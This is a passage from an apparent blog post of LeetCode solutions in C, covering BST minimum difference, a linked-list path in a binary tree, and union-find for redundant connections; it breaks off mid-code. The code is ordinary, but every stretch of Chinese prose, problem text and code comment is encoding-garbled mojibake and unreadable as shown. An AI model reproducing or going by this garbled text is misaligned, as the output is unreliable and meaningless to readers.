[4,2,6,1,3,null,null] å¯è¡¨ç¤ºä¸ºä¸‹å›¾:</p><pre><code>      4    /   \  2      6 / \    1   3  </code></pre><p>æœ€å°çš„å·®å€¼æ˜¯ 1, å®ƒæ˜¯èŠ‚ç‚¹1å’ŒèŠ‚ç‚¹2çš„å·®å€¼, ä¹Ÿæ˜¯èŠ‚ç‚¹3å’ŒèŠ‚ç‚¹2çš„å·®å€¼ã€‚</p><p>æ³¨æ„ï¼š</p><p>äºŒå‰æ ‘çš„å¤§å°èŒƒå›´åœ¨ 2 åˆ° 100ã€‚<br>äºŒå‰æ ‘æ€»æ˜¯æœ‰æ•ˆçš„ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½æ˜¯æ•´æ•°ï¼Œä¸”ä¸é‡å¤ã€‚<br>æœ¬é¢˜ä¸ 530ï¼š<a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/">https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/</a> ç›¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes">https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> pre;</span><br><span class="line"><span class="type">int</span> min;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode * root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(pre != <span class="number">-1</span>)</span><br><span class="line">        min = (root-&gt;val - pre &gt; min) ? min : (root-&gt;val - pre);</span><br><span class="line">    pre = root-&gt;val;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">minDiffInBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    pre = <span class="number">-1</span>;</span><br><span class="line">    min = <span class="number">0xffff</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/12/ZO73tM64GYXsf1c.png" alt="image.png"></p><h1 id="0x02-éš¾åº¦ï¼šä¸­ç­‰"><a href="#0x02-éš¾åº¦ï¼šä¸­ç­‰" class="headerlink" title="0x02.éš¾åº¦ï¼šä¸­ç­‰"></a>0x02.éš¾åº¦ï¼šä¸­ç­‰</h1><h2 id="0x00-äºŒå‰æ ‘ä¸­çš„åˆ—è¡¨"><a href="#0x00-äºŒå‰æ ‘ä¸­çš„åˆ—è¡¨" class="headerlink" title="0x00.äºŒå‰æ ‘ä¸­çš„åˆ—è¡¨"></a>0x00.<a href="https://leetcode-cn.com/problems/linked-list-in-binary-tree/">äºŒå‰æ ‘ä¸­çš„åˆ—è¡¨</a></h2><blockquote><p>ç»™ä½ ä¸€æ£µä»¥ <code>root</code> ä¸ºæ ¹çš„äºŒå‰æ ‘å’Œä¸€ä¸ª <code>head</code> ä¸ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„é“¾è¡¨ã€‚</p><p>å¦‚æœåœ¨äºŒå‰æ ‘ä¸­ï¼Œå­˜åœ¨ä¸€æ¡ä¸€ç›´å‘ä¸‹çš„è·¯å¾„ï¼Œä¸”æ¯ä¸ªç‚¹çš„æ•°å€¼æ°å¥½ä¸€ä¸€å¯¹åº”ä»¥ <code>head</code> ä¸ºé¦–çš„é“¾è¡¨ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å€¼ï¼Œé‚£ä¹ˆè¯·ä½ è¿”å› <code>True </code>ï¼Œå¦åˆ™è¿”å› <code>False</code> ã€‚</p><p>ä¸€ç›´å‘ä¸‹çš„è·¯å¾„çš„æ„æ€æ˜¯ï¼šä»æ ‘ä¸­æŸä¸ªèŠ‚ç‚¹å¼€å§‹ï¼Œä¸€ç›´è¿ç»­å‘ä¸‹çš„è·¯å¾„ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/29/sample_1_1720.png"></p><blockquote><p>è¾“å…¥ï¼šhead &#x3D; [4,2,8], root &#x3D; [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>è¾“å‡ºï¼štrue<br>è§£é‡Šï¼šæ ‘ä¸­è“è‰²çš„èŠ‚ç‚¹æ„æˆäº†ä¸é“¾è¡¨å¯¹åº”çš„å­è·¯å¾„ã€‚</p></blockquote><p>ç¤ºä¾‹ 2ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/29/sample_2_1720.png"></p><blockquote><p>è¾“å…¥ï¼šhead &#x3D; [1,4,2,6], root &#x3D; [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>è¾“å‡ºï¼štrue</p></blockquote><p>ç¤ºä¾‹ 3ï¼š</p><blockquote><p>è¾“å…¥ï¼šhead &#x3D; [1,4,2,6,8], root &#x3D; [1,4,4,null,2,2,null,1,null,6,8,null,null,null,null,1,3]<br>è¾“å‡ºï¼šfalse<br>è§£é‡Šï¼šäºŒå‰æ ‘ä¸­ä¸å­˜åœ¨ä¸€ä¸€å¯¹åº”é“¾è¡¨çš„è·¯å¾„ã€‚</p></blockquote><p>æç¤ºï¼š</p><p>äºŒå‰æ ‘å’Œé“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½æ»¡è¶³ 1 &lt;&#x3D; node.val &lt;&#x3D; 100 ã€‚<br>é“¾è¡¨åŒ…å«çš„èŠ‚ç‚¹æ•°ç›®åœ¨ 1 åˆ° 100 ä¹‹é—´ã€‚<br>äºŒå‰æ ‘åŒ…å«çš„èŠ‚ç‚¹æ•°ç›®åœ¨ 1 åˆ° 2500 ä¹‹é—´ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/linked-list-in-binary-tree">https://leetcode-cn.com/problems/linked-list-in-binary-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>è¿™é¢˜å’‹ä¸€çœ‹å¾ˆéš¾çš„æ ·å­ï¼Œå…¶å®ä»”ç»†ä¸€æƒ³ï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„é€’å½’ç®—æ³•ä¸­çš„äºŒå‰æ ‘çš„å‰åºéå†ğŸï¼Œä¸€è‚¡ç†Ÿæ‚‰çš„æ„Ÿè§‰æ‰‘é¢è€Œæ¥www</p><blockquote><p>å‰åºéå†ï¼šå…ˆéå†æ ¹èŠ‚ç‚¹ï¼Œå†éå†å·¦èŠ‚ç‚¹ï¼Œå†éå†åˆèŠ‚ç‚¹</p></blockquote><blockquote><p>ä¸ç†Ÿæ‚‰é€’å½’ç®—æ³•çš„å¯ä»¥å…ˆçœ‹çœ‹<a href="https://blog.csdn.net/arttnba3/article/details/102748671">æˆ‘ä»¥å‰çš„åšæ–‡</a>ï¼Œç„¶åæŠŠ<a href="http://noi.openjudge.cn/ch0205/1700/">OpenJudge.1700:å…«çš‡åé—®é¢˜</a>ç»™åšäº†ï¼Œé‚£ä¹ˆè¿™é“é¢˜çš„ç®—æ³•ä½ åŸºæœ¬ä¸Šä¹Ÿå°±è¯¥æ˜ç™½äº†</p></blockquote><p><strong>æ€è·¯ï¼šé€’å½’å‰åºéå†äºŒå‰æ ‘æŸ¥æ‰¾å¯¹åº”çš„&quot;é“¾è¡¨&quot;ï¼Œæ‰¾åˆ°äº†ç›´æ¥è¿”å›Trueï¼Œéå†å®Œæ•´æ£µæ ‘éƒ½æ²¡æ‰¾åˆ°åˆ™è¿”å›False</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">seek</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="keyword">struct</span> TreeNode* root)</span><span class="comment">//æ­¤å‡½æ•°è¿›è¡Œå¯¹æ¯”</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span>)<span class="comment">//é“¾è¡¨éå†å®Œäº†ï¼Œç›´æ¥true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)<span class="comment">//é“¾è¡¨æ²¡å®Œæ ‘å…ˆåˆ°å¤´è‚¯å®šæ˜¯false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;val!=root-&gt;val)<span class="comment">//éå†åˆ°ä¸€åŠä¸ä¸€æ ·ï¼Œè‚¯å®šæ˜¯false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> seek(head-&gt;next,root-&gt;left)||seek(head-&gt;next,root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isSubPath</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="keyword">struct</span> TreeNode* root)</span><span class="comment">//æ­¤å‡½æ•°ä»…ç”¨ä½œå¼€å§‹å¯¹æ¯”çš„å…¥å£</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> seek(head,root)||isSubPath(head,root-&gt;left)||isSubPath(head,root-&gt;right);<span class="comment">//æ ¹èŠ‚ç‚¹||å·¦å­©å­åšæ ¹èŠ‚ç‚¹||å³å­©å­åšæ ¹èŠ‚ç‚¹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/23/xOrMznpe3V6hmJ5.png" alt="QQæˆªå›¾20200423032409.png"></p><h2 id="0x01-å†—ä½™è¿æ¥"><a href="#0x01-å†—ä½™è¿æ¥" class="headerlink" title="0x01. å†—ä½™è¿æ¥"></a>0x01.<a href="https://leetcode-cn.com/problems/redundant-connection/"> å†—ä½™è¿æ¥</a></h2><blockquote><p>åœ¨æœ¬é—®é¢˜ä¸­, æ ‘æŒ‡çš„æ˜¯ä¸€ä¸ªè¿é€šä¸”æ— ç¯çš„æ— å‘å›¾ã€‚</p><p>è¾“å…¥ä¸€ä¸ªå›¾ï¼Œè¯¥å›¾ç”±ä¸€ä¸ªæœ‰ç€Nä¸ªèŠ‚ç‚¹ (èŠ‚ç‚¹å€¼ä¸é‡å¤1, 2, â€¦, N) çš„æ ‘åŠä¸€æ¡é™„åŠ çš„è¾¹æ„æˆã€‚é™„åŠ çš„è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹åŒ…å«åœ¨1åˆ°Nä¸­é—´ï¼Œè¿™æ¡é™„åŠ çš„è¾¹ä¸å±äºæ ‘ä¸­å·²å­˜åœ¨çš„è¾¹ã€‚</p><p>ç»“æœå›¾æ˜¯ä¸€ä¸ªä»¥è¾¹ç»„æˆçš„äºŒç»´æ•°ç»„ã€‚æ¯ä¸€ä¸ªè¾¹çš„å…ƒç´ æ˜¯ä¸€å¯¹[u, v] ï¼Œæ»¡è¶³ u &lt; vï¼Œè¡¨ç¤ºè¿æ¥é¡¶ç‚¹u å’Œvçš„æ— å‘å›¾çš„è¾¹ã€‚</p><p>è¿”å›ä¸€æ¡å¯ä»¥åˆ å»çš„è¾¹ï¼Œä½¿å¾—ç»“æœå›¾æ˜¯ä¸€ä¸ªæœ‰ç€Nä¸ªèŠ‚ç‚¹çš„æ ‘ã€‚å¦‚æœæœ‰å¤šä¸ªç­”æ¡ˆï¼Œåˆ™è¿”å›äºŒç»´æ•°ç»„ä¸­æœ€åå‡ºç°çš„è¾¹ã€‚ç­”æ¡ˆè¾¹ [u, v] åº”æ»¡è¶³ç›¸åŒçš„æ ¼å¼ u &lt; vã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥: [[1,2], [1,3], [2,3]]<br>è¾“å‡º: [2,3]<br>è§£é‡Š: ç»™å®šçš„æ— å‘å›¾ä¸º:<br>  1<br> &#x2F; \<br>2 - 3<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥: [[1,2], [2,3], [3,4], [1,4], [1,5]]<br>è¾“å‡º: [1,4]<br>è§£é‡Š: ç»™å®šçš„æ— å‘å›¾ä¸º:<br>5 - 1 - 2<br>    |     |<br>    4 - 3<br>æ³¨æ„:</p><p>è¾“å…¥çš„äºŒç»´æ•°ç»„å¤§å°åœ¨ 3 åˆ° 1000ã€‚<br>äºŒç»´æ•°ç»„ä¸­çš„æ•´æ•°åœ¨1åˆ°Nä¹‹é—´ï¼Œå…¶ä¸­Næ˜¯è¾“å…¥æ•°ç»„çš„å¤§å°ã€‚<br>æ›´æ–°(2017-09-26):<br>æˆ‘ä»¬å·²ç»é‡æ–°æ£€æŸ¥äº†é—®é¢˜æè¿°åŠæµ‹è¯•ç”¨ä¾‹ï¼Œæ˜ç¡®å›¾æ˜¯æ— å‘ å›¾ã€‚å¯¹äºæœ‰å‘å›¾è¯¦è§å†—ä½™è¿æ¥IIã€‚å¯¹äºé€ æˆä»»ä½•ä¸ä¾¿ï¼Œæˆ‘ä»¬æ·±æ„Ÿæ­‰æ„ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/redundant-connection">https://leetcode-cn.com/problems/redundant-connection</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p><del>å›¾æœ‰çš„æ—¶å€™æ˜¯æ ‘ï¼Œæ ‘æ— æ—¶æ— åˆ»æ˜¯å›¾</del></p><h3 id="è§£æ³•ï¼šå¹¶æŸ¥é›†"><a href="#è§£æ³•ï¼šå¹¶æŸ¥é›†" class="headerlink" title="è§£æ³•ï¼šå¹¶æŸ¥é›†"></a>è§£æ³•ï¼šå¹¶æŸ¥é›†</h3><p>ç”±äºæœ¬é¢˜æ‰€ç»™çš„æ˜¯æ— å‘å›¾ï¼Œæ•…ä¸éœ€è¦è€ƒè™‘è¾¹çš„æ–¹å‘</p><p>è€ƒè™‘<strong>å¹¶æŸ¥é›†ç®—æ³•</strong>ï¼šå°†æ‰€æœ‰è”é€šçš„ç‚¹éƒ½çº³å…¥æ•°ä¸ªé›†åˆä¸­ä»¥æ–¹ä¾¿æŸ¥æ‰¾ï¼š</p><ul><li>åˆå§‹åŒ–æ¯ä¸ªç‚¹ä¸ºä¸€ä¸ªè‡ªèº«çš„é›†åˆ</li><li>é€æ¡è¾¹è¯»å…¥ï¼Œåˆ†åˆ«æŸ¥æ‰¾ä¸¤ç«¯ç‚¹æ‰€å±é›†åˆ</li><li><strong>ä¸¤ç‚¹æ‰€å±é›†åˆä¸åŒåˆ™åˆå¹¶ä¸¤é›†åˆï¼Œå¦åˆ™è¿”å›è¯¥æ¡è¾¹å³å¯</strong></li></ul><h3 id="åˆç‰ˆä»£ç "><a href="#åˆç‰ˆä»£ç " class="headerlink" title="åˆç‰ˆä»£ç "></a>åˆç‰ˆä»£ç </h3><p>ä¸€å¼€å§‹æˆ‘æ˜¯è¿™ä¹ˆå†™çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">set</span>[<span class="number">10000</span>][<span class="number">10000</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//ç¬¬ä¸€ç»´åˆ†é…ç»™æ¯ä¸€ä¸ªç‚¹ï¼Œç¬¬äºŒç»´ä½œä¸ºè¯¥ç‚¹çš„é›†åˆä¿å­˜å…¶ä»–é™„åº¸ç‚¹</span></span><br><span class="line"><span class="type">int</span> set_size[<span class="number">10000</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//0è¡¨ç¤ºæ‰€å±é›†åˆï¼Œ1è¡¨ç¤ºé›†åˆä¸­ç‚¹çš„æ•°é‡</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_x</span><span class="params">(<span class="type">int</span> src)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> set_size[src][<span class="number">0</span>] == src ? src : find_x(set_size[src][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">union_set</span><span class="params">(<span class="type">int</span> s1, <span class="type">int</span> s2)</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">while</span>(set_size[s1][<span class="number">0</span>]!=s1)</span><br><span class="line">        s1 = set_size[s1][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span>(set_size[s2][<span class="number">0</span>]!=s2)</span><br><span class="line">        s2 = set_size[s2][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=set_size[s2][<span class="number">1</span>];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        set_size[s1][<span class="number">1</span>]++;</span><br><span class="line">        <span class="built_in">set</span>[s1][set_size[s1][<span class="number">1</span>]] = <span class="built_in">set</span>[s2][i];</span><br><span class="line">    &#125;</span><br><span class="line">    set_size[s2][<span class="number">0</span>] = s1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">findRedundantConnection</span><span class="params">(<span class="type">int</span>** edges, <span class="type">int</span> edgesSize, <span class="type">int</span>* edgesColSize, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;    </span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> *ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>) * <span class="number">2</span>);</span><br><span class="line">    ret[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ret[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        set_size[i][<span class="number">0</span>] = <span class="built_in">set</span>[i][<span class="number">0</span>] = i;</span><br><span class="line">        set_size[i][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> start, end;</span><br><span class="line">    <span class="type">int</span> flag1,flag2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        end = edges[i][<span class="number">1</span>];</span><br><span class="line">        flag1 = find_x(start);</span><br><span class="line">        flag2 = find_x(end);</span><br><span class="line">        <span class="keyword">if</span>(flag1 == flag2)</span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = start;</span><br><span class="line">            ret[<span class="number">1</span>] = end;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        union_set(start,end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºä¸€å¼€å§‹æˆ‘ä»¬å°±åˆå§‹åŒ–ä¸€ä¸ªè¾ƒå¤§çš„äºŒç»´æ•°ç»„ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸Šæ¯”è¾ƒåƒäº</p><p><img src="https://i.loli.net/2020/09/17/3VoQgCI1NvSJ7wt.png" alt="image.png"></p><h3 id="ä¼˜åŒ–ï¼šå‡å°‘å†—ä½™æ­¥éª¤ä¸ç©ºé—´"><a href="#ä¼˜åŒ–ï¼šå‡å°‘å†—ä½™æ­¥éª¤ä¸ç©ºé—´" class="headerlink" title="ä¼˜åŒ–ï¼šå‡å°‘å†—ä½™æ­¥éª¤ä¸ç©ºé—´"></a>ä¼˜åŒ–ï¼šå‡å°‘å†—ä½™æ­¥éª¤ä¸ç©ºé—´</h3><p>æˆ‘ä»¬å°è¯•æ”¹å˜ä¹‹å‰ä¸€æ‹è„‘é—¨æ—¶ç¹å¤å†—æ‚çš„å†™æ³•ï¼Œåœ¨å½’å¹¶æ—¶ä»…è®°å½•é•¿åº¦è¿›è¡Œå½’å¹¶å³å¯ï¼ˆå³å°é›†åˆå½’å¹¶åˆ°å¤§é›†åˆï¼‰ï¼Œå¹¶ä½¿ç”¨åŠ¨æ€æ•°ç»„ä»¥å°½é‡å‡å°‘ç©ºé—´ä½¿ç”¨</p><p>æ€è·¯è¿˜æ˜¯åˆä¹‹å‰çš„ä¸€æ ·ï¼Œæ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> *<span class="built_in">set</span>;</span><br><span class="line"><span class="type">int</span> *set_size;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_x</span><span class="params">(<span class="type">int</span> src)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>[src] == src ? src : find_x(<span class="built_in">set</span>[src]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">union_set</span><span class="params">(<span class="type">int</span> s1, <span class="type">int</span> s2)</span></span><br><span class="line">&#123;    </span><br><span class="line">    s1 = find_x(s1);</span><br><span class="line">    s2 = find_x(s2);</span><br><span class="line">    <span class="keyword">if</span>(set_size[s1]&lt;set_size[s2])</span><br><span class="line">    &#123;</span><br><span class="line">        set_size[s2] += set_size[s1];</span><br><span class="line">        <span class="built_in">set</span>[s1] = <span class="built_in">set</span>[s2];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        set_size[s1] += set_size[s2];</span><br><span class="line">        <span class="built_in">set</span>[s2] = <span class="built_in">set</span>[s1];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">findRedundantConnection</span><span class="params">(<span class="type">int</span>** edges, <span class="type">int</span> edgesSize, <span class="type">int</span>* edgesColSize, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;    </span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> *ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">set</span> = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    set_size = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    ret[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ret[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">set</span>[i] = i;</span><br><span class="line">        set_size[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> start, end;</span><br><span class="line">    <span class="type">int</span> flag1,flag2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        end = edges[i][<span class="number">1</span>];</span><br><span class="line">        flag1 = find_x(start);</span><br><span class="line">        flag2 = find_x(end);</span><br><span class="line">        <span class="keyword">if</span>(flag1 == 